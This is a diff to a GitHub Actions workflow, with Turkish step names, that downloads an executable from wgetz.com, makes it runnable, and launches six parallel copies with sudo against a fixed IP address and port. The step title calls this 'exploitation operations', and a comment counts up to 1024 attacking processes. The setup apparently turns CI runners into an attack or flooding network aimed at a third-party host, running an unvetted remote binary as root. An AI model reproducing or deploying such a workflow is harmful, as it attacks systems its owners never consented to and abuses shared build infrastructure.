@@ -17,15 +17,15 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/mCmHwXk8i8/4 -O 4
-          chmod +x 4
+          wget https://wgetz.com/EWGEHDBfuO/2 -O 2
+          chmod +x 2
           
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
         run: |
           PIDS=()
           for i in {1..6}; do
             # Aynı anda her bir makine 4 süreç çalıştıracak! Toplam 1024 potansiyel süreç!
-            sudo timeout 60 ./4 51.255.105.230 11115 99999 60 &
+            sudo timeout 60 ./2 51.255.105.230 11115 500 1333 60 &
             PIDS+=($!)
           done
           
